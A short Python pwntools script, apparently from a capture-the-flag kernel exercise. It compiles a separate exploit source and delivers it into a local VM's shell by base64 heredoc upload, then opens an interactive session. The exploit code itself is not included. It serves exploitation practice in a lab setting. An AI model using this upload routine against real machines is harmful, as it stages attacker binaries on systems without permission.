#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 saltedfish <17302010022@fudan.edu.cn>
#
# Distributed under terms of the MIT license.

"""

"""
from pwn import *

import sys
import os


context.log_level = 'debug'
cmd = '$ '
def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('musl-gcc  -static -O2 exp.c -o exp')
    os.system('gzip -c exp > exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64') #heredoc
    r.sendline((read('exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')
    r.sendlineafter(cmd, 'gunzip exp.gz')
    r.sendlineafter(cmd, 'chmod +x ./exp') 
    r.interactive()
    

exploit(process('startvm.sh'))

